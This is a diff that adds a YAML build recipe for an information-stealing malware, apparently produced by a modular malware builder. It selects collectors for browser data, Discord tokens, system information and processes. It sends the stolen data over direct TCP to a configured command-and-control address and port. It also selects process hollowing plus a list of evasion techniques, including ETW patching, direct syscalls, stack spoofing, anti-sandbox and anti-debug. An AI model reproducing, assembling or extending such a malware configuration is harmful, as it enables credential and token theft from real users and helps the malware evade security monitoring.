@@ -1,0 +1,28 @@
+name: infostealer_cs_pe_hollow_v1
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes
+- collectors/browser_chromium
+- collectors/discord_tokens
+exfil: exfil/tcp_direct
+arch: arch/process_hollowing
+resources: false
+api_resolve: api_resolve/api_hash_fnv1a
+evasion:
+- evasion/etw_patch
+- evasion/hells_gate
+- evasion/stack_spoof
+- evasion/anti_sandbox
+- evasion/anti_debug
+- evasion/syscall_knowndlls
+- evasion/sleep_lazarus
+- evasion/behavioral_pacing
+- evasion/fiber_exec
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
